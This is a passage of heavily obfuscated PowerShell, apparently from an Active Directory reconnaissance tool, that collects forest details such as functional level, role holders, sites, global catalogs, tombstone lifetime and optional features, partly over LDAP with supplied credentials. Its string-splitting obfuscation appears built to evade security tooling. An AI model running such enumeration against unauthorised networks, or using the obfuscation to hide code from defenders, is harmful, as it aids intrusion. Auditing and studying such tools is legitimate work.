            &("{0}{3}{1}{2}" -f'W','-Ver','bose','rite') ("{2}{7}{3}{1}{6}{5}{9}{4}{0}{8}"-f 'e','rest] Erro','[Get','RFo','or','ting','r get','-AD','st Context',' F')
            &("{2}{0}{3}{4}{1}"-f'e','rbose','Writ','-','Ve') "[EXCEPTION] $($_.Exception.Message) "
        }
        &("{1}{2}{0}"-f 'e-Variable','Remo','v') ("{0}{1}"-f 'A','DDomain')

        If (-Not ${A`DfORe`st})
        {
            Try
            {
                ${Ad`FoR`esT} = &("{0}{2}{1}{3}" -f 'Ge','-ADFores','t','t') -Server ${dOmaINCOnTR`o`l`lER}
            }
            Catch
            {
                &("{3}{2}{1}{0}"-f'rning','Wa','-','Write') ("{2}{3}{9}{8}{12}{6}{4}{13}{17}{15}{7}{1}{5}{10}{14}{11}{0}{16}"-f'e','sing ','[Get-AD','RForest]','tti','Se','ge','u','Error',' ','rver','am',' ','ng Fore',' par','Context ','ter','st ')
                &("{2}{3}{0}{1}"-f'bos','e','Wr','ite-Ver') "[EXCEPTION] $($_.Exception.Message) "
                Return ${NU`Ll}
            }
        }

        If (${A`Df`OREsT})
        {
            
            Try
            {
                ${a`dFoR`eStC`Nc} = (&("{2}{1}{0}"-f'tDSE','oo','Get-ADR'))."conF`iGU`RATi`on`NA`MI`NgconTeXT"
                ${AdFoRE`S`TDsCp} = &("{0}{1}{2}"-f'Get','-ADObje','ct') -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC) " -Partition ${A`dfoR`E`sTCNC} -Properties ('*')
                ${aDFor`esttoMbS`TOnE`L`IfetImE} = ${a`dFOres`TD`SCp}."TO`mBStON`eLif`EtIme"
                &("{2}{1}{0}"-f 'able','emove-Vari','R') ("{3}{0}{2}{1}"-f'DFo','tCNC','res','A')
                &("{0}{4}{2}{1}{3}" -f 'Remo','-','e','Variable','v') ("{3}{1}{0}{2}" -f'est','or','DSCP','ADF')
            }
            Catch
            {
                &("{3}{2}{0}{1}" -f 'i','ng','arn','Write-W') ("{0}{5}{4}{9}{6}{10}{3}{8}{7}{1}{2}" -f'[Get-','im','e','i',' retrieving Tomb','ADRForest] Error','o','t','fe','st','ne L')
                &("{0}{1}{3}{2}"-f'Wr','i','Verbose','te-') "[EXCEPTION] $($_.Exception.Message) "
            }

            
            If ( (  get-ChIldIteM  VarIAblE:0528HS  ).vAlue::("{2}{1}{0}"-f 'nt32','oI','T').Invoke(${A`D`FO`REsT}."fOrEst`M`oDe") -ge 6)
            {
                Try
                {
                    ${adREc`yClE`B`iN} = &("{4}{5}{2}{3}{1}{0}" -f 're','lFeatu','Optio','na','Get','-AD') -Identity ("{4}{2}{3}{0}{1}" -f'e','ature','cycle Bin ','F','Re')
                }
                Catch
                {
                    &("{3}{4}{2}{1}{0}" -f 'g','-Warnin','e','Wri','t') ("{0}{8}{11}{5}{9}{3}{13}{14}{4}{6}{1}{12}{7}{2}{10}" -f '[Get-ADRFor','Recycl',' Fe','r ','ving',' ',' ',' Bin','es','Erro','ature','t]','e','r','etrie')
                    &("{0}{1}{2}"-f'Writ','e-Ver','bose') "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            
            If ( (vaRiabLe 0528hs).Value::("{0}{1}" -f'T','oInt32').Invoke(${a`D`FOrEsT}."f`O`Re`stmoDE") -ge 7)
            {
                Try
                {
                    ${pRiv`il`E`GEDAcc`ESSman`A`geMeNt} = &("{6}{1}{3}{0}{5}{2}{4}" -f'a','ADOpti','Featur','on','e','l','Get-') -Identity ("{1}{2}{3}{4}{6}{5}{7}{0}"-f' Feature','Privi','l','ege','d ','agem','Access Man','ent')
                }
                Catch
                {
                    &("{0}{1}{3}{2}" -f'W','rit','Warning','e-') ("{8}{4}{7}{9}{10}{0}{3}{6}{2}{5}{1}" -f' retrieving ','ture','nt F','Privileged Accee','DRF','ea','ss Manageme','o','[Get-A','r','est] Error')
                    &("{0}{1}{2}"-f 'Write-Verb','os','e') "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            ${Fo`Re`stobJ} = @()

            
            ${FL`Ad} = @{
                0 = ("{0}{2}{1}" -f 'Wi','0','ndows200');
                1 = ("{0}{1}{2}{3}"-f 'Windo','ws200','3/','Interim');
                2 = ("{0}{1}{2}"-f'Windo','ws20','03');
                3 = ("{1}{0}{2}{3}"-f'indows','W','20','08');
                4 = ("{0}{2}{1}"-f 'Windows2008','2','R');
                5 = ("{1}{0}{2}" -f 'ws20','Windo','12');
                6 = ("{1}{3}{0}{2}"-f'01','Windows','2R2','2');
                7 = ("{0}{2}{1}" -f 'W','s2016','indow')
            }
            ${f`ore`stMODe} = ${FL`Ad}[  (VaRiAbLE ("05"+"28"+"Hs") -vAluEO  )::("{1}{2}{0}"-f 'Int32','T','o').Invoke(${a`dFo`Re`sT}."F`o`REstmode")] + ("{1}{0}" -f 'st','Fore')
            &("{3}{2}{1}{4}{0}"-f'iable','e-V','emov','R','ar') ("{1}{0}"-f 'AD','FL')

            If (-Not ${F`oR`ESTModE})
            {
                ${fo`Re`stMo`de} = ${a`dFo`REST}."FoRes`Tm`ode"
            }

            ${OBjVa`L`UEs} = @(("{1}{0}" -f 'me','Na'), ${A`dfOr`est}."N`AME", ("{3}{2}{1}{0}{4}"-f'nal Leve','io','ct','Fun','l'), ${fO`Re`s`TMODe}, ("{0}{5}{3}{1}{4}{2}"-f 'Do',' ','ming Master','in','Na','ma'), ${Adf`oREst}."DOMAI`NnamInGM`A`S`T`Er", ("{3}{0}{2}{1}" -f ' Mas','r','te','Schema'), ${adfO`Re`sT}."s`chEM`AmAst`er", ("{0}{1}{2}" -f 'Roo','t','Domain'), ${a`Df`O`ReST}."roo`T`DOmA`in", ("{0}{1}{3}{2}" -f'Domai','n','ount',' C'), ${aDfo`R`eST}."dOM`AIns"."COU`Nt", ("{0}{1}{2}"-f 'Site Co','un','t'), ${AdFO`R`eST}."sIT`Es"."cO`UNt", ("{3}{0}{1}{2}{4}" -f 'al C','atalo','g Coun','Glob','t'), ${A`D`ForEsT}."glO`Ba`lcA`TALO`GS"."CO`UNt")

            For (${i} = 0; ${I} -lt $(${OBj`V`A`LueS}."C`OUnT"); ${I}++)
            {
                ${o`BJ} = &("{1}{0}{2}" -f 'je','New-Ob','ct') ("{0}{1}{2}"-f'PSObje','c','t')
                ${o`BJ} | &("{3}{1}{0}{2}" -f'b','em','er','Add-M') -MemberType ("{2}{0}{1}{3}"-f'Prop','e','Note','rty') -Name ("{1}{0}" -f'gory','Cate') -Value ${O`BjV`AluEs}[${I}]
                ${o`Bj} | &("{1}{0}{2}" -f'dd','A','-Member') -MemberType ("{2}{3}{1}{0}"-f 'erty','op','Not','ePr') -Name ("{0}{1}" -f 'V','alue') -Value ${o`B`jv`ALUES}[${I}+1]
                ${I}++
                ${FOr`eStO`BJ} += ${o`Bj}
            }
            &("{1}{0}{2}"-f'iabl','Remove-Var','e') ("{1}{0}{3}{2}" -f'r','Fo','ode','estM')

            For(${i}=0; ${I} -lt ${A`dfo`REsT}."dO`Ma`Ins"."cO`UNt"; ${i}++)
            {
                ${O`Bj} = &("{1}{0}{2}"-f 'w','Ne','-Object') ("{1}{2}{0}" -f 'bject','P','SO')
                ${O`BJ} | &("{1}{3}{0}{2}" -f'-Me','Ad','mber','d') -MemberType ("{2}{3}{1}{0}" -f 'erty','op','N','otePr') -Name ("{0}{2}{1}" -f'Cate','y','gor') -Value ("{0}{1}"-f'D','omain')
                ${o`BJ} | &("{0}{1}{2}" -f 'Ad','d-Memb','er') -MemberType ("{0}{3}{2}{1}"-f'NotePr','ty','r','ope') -Name ("{0}{1}" -f'Valu','e') -Value ${A`dfoR`eSt}."DoM`A`INS"[${i}]
                ${FoRE`S`TobJ} += ${O`Bj}
            }
            For(${I}=0; ${I} -lt ${ADfoRe`sT}."sI`Tes"."co`UnT"; ${i}++)
            {
                ${o`Bj} = &("{3}{1}{0}{2}"-f 'je','b','ct','New-O') ("{0}{2}{1}"-f 'PSOb','ect','j')
                ${O`Bj} | &("{1}{2}{0}{3}" -f 'emb','Add','-M','er') -MemberType ("{1}{2}{3}{0}" -f 'y','NoteProp','er','t') -Name ("{2}{0}{1}"-f'go','ry','Cate') -Value ("{0}{1}" -f'Sit','e')
                ${O`BJ} | &("{2}{1}{0}" -f'er','-Memb','Add') -MemberType ("{1}{2}{0}{3}" -f 'p','NoteP','ro','erty') -Name ("{1}{0}"-f'e','Valu') -Value ${ADF`O`RE`sT}."S`ITEs"[${i}]
                ${Fo`REs`To`Bj} += ${O`BJ}
            }
            For(${I}=0; ${i} -lt ${aDf`ORest}."Gl`OBalcaTa`l`OgS"."cO`UNT"; ${I}++)
            {
                ${o`BJ} = &("{0}{1}{2}"-f'New-Ob','jec','t') ("{1}{2}{0}"-f 'ject','PSO','b')
                ${O`Bj} | &("{2}{1}{0}"-f'mber','Me','Add-') -MemberType ("{2}{0}{1}"-f 'e','rty','NoteProp') -Name ("{2}{0}{1}"-f 'o','ry','Categ') -Value ("{1}{2}{0}{3}" -f 'a','Glo','balC','talog')
                ${o`BJ} | &("{0}{2}{1}{3}" -f 'Add','embe','-M','r') -MemberType ("{1}{0}{2}" -f'tePrope','No','rty') -Name ("{0}{1}" -f 'Valu','e') -Value ${ADf`ORE`ST}."gL`OB`ALcAt`Al`Ogs"[${i}]
                ${FOR`e`stO`Bj} += ${O`Bj}
            }

            ${O`Bj} = &("{2}{1}{0}" -f'ject','Ob','New-') ("{0}{1}{2}" -f'PSObj','ec','t')
            ${o`BJ} | &("{1}{0}{2}" -f '-Membe','Add','r') -MemberType ("{3}{0}{1}{2}"-f'Pro','p','erty','Note') -Name ("{2}{0}{1}" -f'ego','ry','Cat') -Value ("{1}{3}{2}{0}"-f'one Lifetime','To','st','mb')
            If (${AD`FoReSttO`MBStO`NeL`i`FEtIMe})
            {
                ${O`Bj} | &("{1}{2}{0}"-f 'ber','Add','-Mem') -MemberType ("{0}{2}{3}{1}"-f'N','perty','otePr','o') -Name ("{1}{0}"-f 'alue','V') -Value ${AdFO`Re`STTOMBsto`NELiF`ETiMe}
                &("{1}{2}{3}{0}{4}"-f '-V','Rem','ov','e','ariable') ("{0}{3}{1}{2}{4}{6}{5}" -f'AD','or','estTombst','F','oneLifet','me','i')
            }
            Else
            {
                ${o`BJ} | &("{2}{1}{0}"-f 'er','d-Memb','Ad') -MemberType ("{2}{1}{0}{3}"-f'per','Pro','Note','ty') -Name ("{1}{0}"-f'ue','Val') -Value ("{2}{1}{3}{0}"-f 'd','Retri','Not ','eve')
            }
            ${FO`REST`oBj} += ${O`Bj}

            ${o`BJ} = &("{1}{2}{0}" -f 'ct','Ne','w-Obje') ("{1}{0}" -f 'SObject','P')
            ${O`BJ} | &("{2}{1}{0}" -f'Member','dd-','A') -MemberType ("{0}{1}{2}" -f 'Note','Propert','y') -Name ("{2}{1}{0}"-f 'y','gor','Cate') -Value ("{2}{4}{6}{0}{3}{7}{1}{5}{8}"-f'in (200','R','Recyc','8','le ','2 ','B',' ','onwards)')
            If (${AdrEc`y`cl`eb`in})
            {
                If (${Ad`RECyC`lEBiN}."en`ABLe`dS`cOPes"."cO`Unt" -gt 0)
                {
                    ${O`BJ} | &("{0}{3}{2}{1}" -f 'A','ber','-Mem','dd') -MemberType ("{1}{3}{2}{0}" -f'y','NotePro','t','per') -Name ("{0}{1}" -f 'Va','lue') -Value ("{0}{2}{1}" -f'E','led','nab')
                    ${F`O`R`EStOBj} += ${O`BJ}
                    For(${I}=0; ${I} -lt $(${aDRe`c`ycle`BIN}."EN`AB`led`sCopes"."c`OUNt"); ${i}++)
                    {
                        ${o`BJ} = &("{0}{3}{1}{2}"-f'N','w-Obj','ect','e') ("{2}{1}{0}"-f 'Object','S','P')
                        ${o`Bj} | &("{2}{0}{1}"-f 'dd','-Member','A') -MemberType ("{3}{2}{0}{1}" -f'p','erty','ro','NoteP') -Name ("{0}{1}" -f'Categ','ory') -Value ("{1}{2}{0}{3}"-f'd S','Enabl','e','cope')
                        ${O`Bj} | &("{0}{2}{1}" -f 'Add-','r','Membe') -MemberType ("{3}{0}{1}{2}" -f 'o','teProp','erty','N') -Name ("{1}{0}"-f'lue','Va') -Value ${aDRE`CYc`leBIN}."e`NabledSc`O`pes"[${I}]
                        ${for`EStO`Bj} += ${o`BJ}
                    }
                }
                Else
                {
                    ${O`Bj} | &("{1}{2}{0}"-f'ber','Add-','Mem') -MemberType ("{2}{0}{1}"-f'otePro','perty','N') -Name ("{0}{1}"-f'Val','ue') -Value ("{1}{2}{0}"-f 'ed','D','isabl')
                    ${fores`T`oBj} += ${o`Bj}
                }
                &("{1}{0}{4}{3}{2}"-f 'move','Re','le','ariab','-V') ("{1}{0}{2}" -f 'yc','ADRec','leBin')
            }
            Else
            {
                ${O`Bj} | &("{2}{0}{1}{3}"-f 'dd-M','e','A','mber') -MemberType ("{2}{1}{0}"-f 'ty','oper','NotePr') -Name ("{1}{0}"-f'lue','Va') -Value ("{2}{0}{1}" -f 'ab','led','Dis')
                ${F`OResTo`Bj} += ${O`Bj}
            }

            ${O`Bj} = &("{2}{3}{1}{0}"-f't','ec','New-','Obj') ("{2}{0}{1}"-f'b','ject','PSO')
            ${O`Bj} | &("{2}{3}{1}{0}" -f 'ber','m','Add-M','e') -MemberType ("{0}{2}{3}{1}"-f 'NoteProp','y','er','t') -Name ("{0}{2}{1}" -f'Cat','y','egor') -Value ("{0}{2}{6}{4}{5}{9}{10}{1}{3}{8}{7}"-f'Privil','nt (','eg','201','ccess M','anag','ed A','ards)','6 onw','em','e')
            If (${PrIV`I`L`eGeDAC`CesSMANaGEm`E`NT})
            {
                If (${priViL`e`GE`da`cceS`SmaNA`GeMENt}."EnaBLEd`SCO`P`es"."coU`Nt" -gt 0)
                {
                    ${O`BJ} | &("{0}{2}{1}"-f 'A','r','dd-Membe') -MemberType ("{1}{3}{0}{2}" -f'P','N','roperty','ote') -Name ("{0}{1}"-f'Val','ue') -Value ("{1}{0}" -f'bled','Ena')
                    ${for`E`StobJ} += ${O`BJ}
                    For(${i}=0; ${i} -lt $(${PrIVILeGEDAc`CE`sSmA`NAG`Em`E`Nt}."eNA`BleDS`CopEs"."c`oUNt"); ${i}++)
                    {
                        ${o`BJ} = &("{1}{3}{2}{0}" -f 'ect','N','bj','ew-O') ("{1}{0}{2}" -f'SO','P','bject')
                        ${O`BJ} | &("{2}{1}{0}"-f'mber','dd-Me','A') -MemberType ("{3}{2}{1}{0}"-f 'y','rt','e','NoteProp') -Name ("{2}{1}{0}" -f 'tegory','a','C') -Value ("{2}{0}{3}{1}"-f 'S','e','Enabled ','cop')
                        ${O`BJ} | &("{1}{0}{2}" -f '-Memb','Add','er') -MemberType ("{0}{1}{3}{2}"-f'N','ote','operty','Pr') -Name ("{0}{1}"-f'Valu','e') -Value ${p`RIVil`EGed`AccE`sSMa`NaG`emEnt}."eNaB`l`eD`SC`OPeS"[${i}]
                        ${foRes`T`o`Bj} += ${o`BJ}
                    }
                }
                Else
                {
                    ${o`Bj} | &("{3}{1}{0}{2}" -f'embe','dd-M','r','A') -MemberType ("{1}{0}{2}{3}" -f't','No','eP','roperty') -Name ("{0}{1}"-f 'Va','lue') -Value ("{0}{2}{1}" -f'D','led','isab')
                    ${fo`R`esTOBJ} += ${O`Bj}
                }
                &("{1}{3}{2}{0}" -f'le','Remove','Variab','-') ("{2}{0}{3}{4}{1}{5}" -f'legedA','Managemen','Privi','cces','s','t')
            }
            Else
            {
                ${o`Bj} | &("{2}{1}{0}" -f'r','Membe','Add-') -MemberType ("{1}{2}{0}" -f'ty','NotePr','oper') -Name ("{1}{0}" -f'lue','Va') -Value ("{1}{0}{2}" -f 'sable','Di','d')
                ${f`oR`eSToBj} += ${O`BJ}
            }
            &("{2}{3}{1}{0}" -f'ble','ia','R','emove-Var') ("{0}{1}{2}" -f 'AD','Fo','rest')
        }
    }

    If (${m`ETHOD} -eq ("{1}{0}"-f 'AP','LD'))
    {
        If (${cRe`DeN`TIaL} -ne  ( LS  VARiaBLE:NK5P  ).VaLue::"E`mpTy")
        {
            ${DomA`i`Nfq`dN} = &("{2}{0}{1}"-f'Nto','FQDN','Get-D')(${oBJ`dOm`AIn}."DI`STIngu`isH`ednAme")
            ${domAIn`C`O`Nt`exT} = &("{0}{1}{2}"-f'Ne','w-','Object') ("{10}{2}{4}{7}{3}{8}{5}{6}{0}{1}{9}"-f 'Dir','ector','yst','to','em.Dir','ces.Act','ive','ec','ryServi','y.DirectoryContext','S')(("{1}{0}" -f'main','Do'),$(${doMain`FQ`dN}),$(${cr`eDE`NtIAl}."uSer`NaME"),$(${CreD`eNT`IAl}.("{5}{0}{3}{4}{1}{2}" -f'etN','rkCred','ential','e','two','G').Invoke()."PAS`SwoRD"))
            Try
            {
                ${ADdO`mA`iN} =   (  gET-VAriaBLe lbFUD2).VALUE::("{0}{1}" -f 'GetDo','main').Invoke(${doMa`InCO`Nt`EXt})
            }
            Catch
            {
                &("{3}{1}{2}{0}"-f'ning','ite-W','ar','Wr') ("{11}{7}{10}{0}{8}{9}{5}{1}{3}{13}{12}{6}{2}{4}"-f'DRF','g ','n Co','D','ntext','tin','i','Get-','orest] Er','ror get','A','[','ma','o')
                &("{1}{2}{0}{3}"-f'-Verbo','Wr','ite','se') "[EXCEPTION] $($_.Exception.Message) "
                Return ${Nu`lL}
            }
            &("{3}{0}{2}{1}" -f 'move-Va','able','ri','Re') ("{2}{1}{0}" -f 'Context','in','Doma')

            ${for`E`sTconT`eXT} = &("{0}{2}{3}{1}" -f 'New-','ect','O','bj') ("{7}{2}{9}{3}{0}{6}{4}{8}{1}{5}{10}"-f 'vices.','ir','stem.Director','r','i','ectoryConte','ActiveD','Sy','rectory.D','ySe','xt')(("{1}{0}" -f'st','Fore'),$(${ADdo`M`A`In}."for`eST"),$(${CrEde`NtI`Al}."USE`RNAME"),$(${Cr`E`d`ENtial}.("{2}{0}{5}{6}{1}{4}{3}" -f 'etNe','e','G','tial','n','tworkCre','d').Invoke()."p`AS`sWoRD"))
            &("{1}{2}{0}{3}"-f'iabl','Remove-V','ar','e') ("{1}{0}{2}" -f'DDoma','A','in')
            Try
            {
                ${a`DFo`Re`st} =  $ydlzCG::("{2}{1}{0}" -f'orest','etF','G').Invoke(${foreSTCon`T`E`xT})
            }
            Catch
            {
                &("{3}{1}{2}{0}" -f 'rning','ite-W','a','Wr') ("{2}{7}{3}{8}{6}{4}{0}{10}{1}{13}{9}{5}{11}{12}" -f'ge','n','[Get-','R','or ','rest C','rr','AD','Forest] E','Fo','tti','on','text','g ')
                &("{2}{0}{1}" -f'r','ite-Verbose','W') "[EXCEPTION] $($_.Exception.Message) "
                Return ${n`ULL}
            }
            &("{1}{0}{2}{3}" -f '-Var','Remove','iab','le') ("{0}{1}{3}{2}" -f 'F','or','ontext','estC')

            
            Try
            {
                ${sEarcHP`A`Th} = ("{6}{12}{9}{13}{1}{11}{2}{0}{10}{3}{5}{4}{7}{8}" -f'e,CN=',' S','vic','ndows ','T,CN=S','N','C','erv','ices','Direc','Wi','er','N=','tory')
                ${Ob`JsEArc`HPatH} = &("{1}{3}{2}{0}"-f't','Ne','-Objec','w') ("{10}{0}{2}{1}{4}{8}{3}{6}{11}{7}{9}{5}" -f'e','ryServic','m.Directo','ctor','es.Di','y','y','t','re','r','Syst','En') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", ${CR`eDenTI`Al}."usErN`AME",${cr`edeN`TiAL}.("{1}{3}{0}{4}{5}{2}"-f'e','GetN','l','etworkCr','d','entia').Invoke()."Pa`ssWO`RD"
                ${oBJSE`ARche`R`PA`TH} = &("{2}{1}{0}"-f 'Object','ew-','N') ("{2}{3}{5}{11}{9}{6}{4}{8}{1}{7}{0}{10}{12}"-f'e','ec','Sys','t','Services','e','ory','toryS','.Dir','t','arche','m.Direc','r') ${oBJsE`A`RCh`PATh}
                ${ObJ`sEar`Che`RpaTh}."FI`L`TER"=("{0}{1}{5}{4}{2}{3}{6}" -f '(n','ame=Di','tory',' ','c','re','Service)')
                ${o`BjSeArcH`eR`REs`ULt} = ${ob`Jse`ARchERPATH}.("{2}{0}{1}" -f 'A','ll','Find').Invoke()
                ${AD`F`OReSTt`om`BstONe`lIfEtImE} = ${OB`Js`E`ArcHerrE`SUlT}."prO`PeRt`ieS"."tOm`BS`TOneLIFET`imE"
                &("{2}{1}{0}" -f 'le','riab','Remove-Va') ("{1}{0}{2}" -f 'ch','Sear','Path')
                ${OBjSe`ARch`p`ATh}.("{1}{0}"-f'ose','Disp').Invoke()
                ${OBJSEAR`CH`Er`p`AtH}.("{2}{0}{1}"-f'sp','ose','Di').Invoke()
                ${oB`j`S`E`ARCherresUlT}.("{0}{1}{2}"-f 'Di','spo','se').Invoke()
            }
            Catch
            {
                &("{2}{0}{1}" -f 'rnin','g','Write-Wa') ("{11}{5}{4}{2}{8}{0}{3}{9}{1}{13}{12}{6}{10}{7}"-f'RFore',' ','-A','st] Er','t','Ge','evi','ne Lifetime','D','ror','ng Tombsto','[','i','retr')
                &("{3}{2}{1}{4}{0}" -f 'e','te-V','ri','W','erbos') "[EXCEPTION] $($_.Exception.Message) "
            }
            
            If ( $0528hs::("{1}{2}{0}" -f '2','ToIn','t3').Invoke(${OBJDo`Ma`INR`OOT`dSe}."fO`RES`TfUncTi`oN`AliTy",10) -ge 6)
            {
                Try
                {
                    ${Se`ArcHP`Ath} = ("{7}{11}{14}{0}{3}{15}{19}{5}{2}{22}{13}{4}{6}{9}{10}{21}{16}{12}{1}{24}{20}{17}{18}{8}{23}" -f 'c','Wi','N=','ycle B',' Fea',',C','tur','CN=','Config','es,CN=Di','rectory','R','CN=','ptional','e','in',',','CN=Services,C','N=',' Feature','NT,',' Service','O','uration','ndows ')
                    ${oBJSE`ArC`h`pATh} = &("{1}{3}{2}{0}" -f 'ct','New-','je','Ob') ("{8}{6}{7}{0}{5}{2}{1}{3}{4}"-f 'y','ctor','re','yEnt','ry','Services.Di','tem.Direct','or','Sys') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", ${credE`NTi`AL}."usEr`N`AME",${C`ReDeN`TiAL}.("{3}{2}{4}{1}{0}"-f 'ial','dent','tNetwor','Ge','kCre').Invoke()."Pas`sword"
                    ${Obj`sEaRCh`E`R`PAtH} = &("{0}{1}{2}" -f'New-','O','bject') ("{8}{4}{0}{6}{10}{11}{1}{2}{9}{3}{7}{5}" -f'.','ices.Dir','ecto','ea','m','her','Direc','rc','Syste','ryS','toryS','erv') ${oBj`S`earc`hpath}
                    ${a`dReC`YCLE`BIN} = ${OBjse`Ar`cHe`RpaTH}.("{1}{0}"-f 'indAll','F').Invoke()
                    &("{1}{3}{2}{0}{4}" -f'V','Remo','-','ve','ariable') ("{0}{2}{1}" -f 'S','ath','earchP')
                    ${ob`j`seARchpaTh}.("{2}{1}{0}"-f 'spose','i','D').Invoke()
                    ${oBjseAr`c`hERP`A`Th}.("{2}{0}{1}"-f's','pose','Di').Invoke()
                }
                Catch
                {
                    &("{0}{3}{1}{2}"-f'W','te','-Warning','ri') ("{1}{10}{5}{6}{0}{4}{2}{11}{7}{3}{8}{9}"-f 'i','[','ng ','Bin','evi','t','r','cycle ',' Featur','e','Get-ADRForest] Error re','Re')
                    &("{0}{1}{3}{2}" -f 'Wri','te','se','-Verbo') "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            
            If ( (  DIR  VaRiABle:0528HS).VAlue::("{2}{1}{0}"-f't32','oIn','T').Invoke(${O`B`JDOmAI`N`RootdsE}."fOr`E`s`TfUNCtION`AlI`TY",10) -ge 7)
            {
                Try
                {
                    ${s`ear`chPatH} = ("{11}{22}{0}{8}{26}{16}{7}{20}{18}{3}{25}{9}{14}{13}{4}{21}{12}{17}{6}{10}{24}{1}{23}{15}{5}{2}{19}" -f 'ged Acces','ows NT,CN=S','onfigurat','a','l Fe','N=C','ory S','eme','s ',',CN=Opti','ervice,CN=','CN=','=Direc','na','o','C','g','t','e','ion','nt F','atures,CN','Privile','ervices,','Wind','ture','Mana')
                    ${o`BjSeARc`hPAth} = &("{3}{2}{0}{1}"-f 'Obje','ct','ew-','N') ("{9}{5}{6}{0}{2}{4}{8}{3}{7}{10}{11}{1}"-f'i','ry','rectory','t','Se','m.','D','o','rvices.Direc','Syste','ryE','nt') "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", ${c`R`EdENTiAL}."uS`Er`NAmE",${C`REdEnT`I`AL}.("{4}{2}{0}{1}{3}" -f'or','kCredent','tNetw','ial','Ge').Invoke()."pA`sS`wOrD"
                    ${o`BJSeaRc`H`erPA`Th} = &("{1}{0}{2}" -f'O','New-','bject') ("{9}{8}{7}{10}{1}{0}{6}{2}{3}{4}{5}" -f'.D','es','tor','yS','earch','er','irec','v','rySer','System.Directo','ic') ${ObjSe`AR`Ch`PAtH}
                    ${PrIVILE`GedacC`e`s`SMANaGeM`EnT} = ${oB`j`sE`ARcHerpaTH}.("{1}{0}" -f'All','Find').Invoke()
                    &("{0}{3}{4}{2}{1}" -f'Remove','le','ab','-Var','i') ("{0}{2}{1}" -f'Se','th','archPa')
                    ${OBJ`S`Ea`R`ChpAtH}.("{0}{1}" -f 'D','ispose').Invoke()
                    ${ObjS`Ear`ch`e`RPAtH}.("{1}{0}{2}" -f 'i','D','spose').Invoke()
                }
                Catch
                {
                    &("{3}{0}{2}{1}"-f '-W','g','arnin','Write') ("{16}{9}{17}{7}{2}{1}{15}{14}{3}{11}{19}{13}{18}{5}{10}{6}{4}{12}{8}{0}" -f'e','Err','DRForest] ','retr','a','cc',' Management Fe','A','ur','Get','ess','ieving Privileg','t','d ','r ','o','[','-','A','e')
                    &("{2}{0}{1}" -f 'rite-','Verbose','W') "[EXCEPTION] $($_.Exception.Message) "
                }
            }
        }
        Else
        {
            ${adD`O`mAin} =  $LBFuD2::("{0}{2}{1}{3}"-f'G','CurrentDo','et','main').Invoke()
            ${aD`ForEST} =   $ydlzcg::("{0}{1}{3}{4}{2}" -f 'Get','Cu','tForest','rr','en').Invoke()

            
            ${a`DfoRe`STtO`M`BSTOnelifEtImE} = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext) ")."ToM`Bs`TO`NeLIfe`TiMe"."VA`LuE"

            
            If ( (  GET-cHilDITEm  ('v'+'ArIable:0'+'528h'+'S')  ).vAluE::("{0}{1}"-f 'ToInt','32').Invoke(${obJDOMA`IN`R`OOT`dSE}."FoR`EstFUN`c`T`IO`NAlITY",10) -ge 6)
            {
                ${ad`R`e`CYcL`ebin} = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
            
            If (  $0528hs::("{2}{0}{1}" -f'In','t32','To').Invoke(${obJd`om`AiNroo`Td`se}."f`o`R`eST`F`UNcTiONalITY",10) -ge 7)
            {
                ${p`R`iV`i`L`eged`Acc`EsSmAnag`EmeNT} = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
        }

        If (${AdFo`REST})
        {
            ${f`O`ReSTObJ} = @()

            
            ${f`LAD} = @{
	            0 = ("{2}{3}{0}{1}"-f'ows200','0','W','ind');
	            1 = ("{1}{2}{4}{3}{0}" -f 'rim','W','indows','Inte','2003/');
	            2 = ("{0}{3}{2}{1}" -f'Wi','03','dows20','n');
	            3 = ("{1}{0}{3}{2}"-f'ow','Wind','2008','s');
	            4 = ("{0}{3}{2}{1}"-f'Windo','2008R2','s','w');
	            5 = ("{0}{2}{3}{1}" -f 'Wi','ws2012','nd','o');
	            6 = ("{1}{0}{2}"-f'12','Windows20','R2');
                7 = ("{0}{2}{3}{1}" -f'Wi','6','ndow','s201')
            }
            ${fOreS`TM`oDe} = ${f`LaD}[  $0528hS::("{2}{1}{0}"-f 't32','oIn','T').Invoke(${O`BjDo`maInROo`T`dse}."f`OR`E`sTFunC`TIoNA`LiTy",10)] + ("{1}{0}" -f 'st','Fore')
            &("{1}{2}{0}{3}{4}" -f'ove-V','Re','m','ari','able') ("{1}{0}" -f'AD','FL')

            ${o`BjvA`luES} = @(("{0}{1}"-f'Nam','e'), ${ADFO`ReST}."na`ME", ("{1}{2}{4}{3}{0}" -f 'l','Fu','nctiona','eve','l L'), ${f`Or`estm`oDe}, ("{1}{4}{3}{2}{0}" -f'er','Domain Naming','st','Ma',' '), ${Ad`F`orESt}."n`A`MING`RolEOwNER", ("{0}{1}{2}{3}" -f 'Sche','ma',' ','Master'), ${a`DFOr`e`sT}."sch`eMaR`OLeo`W`NER", ("{2}{1}{0}" -f 'in','otDoma','Ro'), ${A`DFOrE`ST}."rooT`do`mA`iN", ("{1}{2}{0}{3}"-f 'u','D','omain Co','nt'), ${a`DFOr`EsT}."dO`mainS"."c`ount", ("{0}{1}{2}"-f 'Site ','C','ount'), ${ad`Fo`ResT}."S`ITES"."CO`UNT", ("{5}{0}{3}{1}{2}{4}"-f'o','Cat','alog','bal ',' Count','Gl'), ${aDfor`e`sT}."g`LoBAL`ca`TA`loGs"."Co`UNt")

            For (${i} = 0; ${I} -lt $(${O`B`jvALUES}."coU`NT"); ${i}++)
            {
                ${O`Bj} = &("{1}{2}{0}" -f 'ct','New','-Obje') ("{0}{1}"-f'PSObje','ct')
                ${O`BJ} | &("{2}{3}{1}{0}" -f 'er','-Memb','A','dd') -MemberType ("{3}{1}{0}{2}" -f'per','Pro','ty','Note') -Name ("{1}{0}"-f'egory','Cat') -Value ${Ob`j`VaLuEs}[${I}]
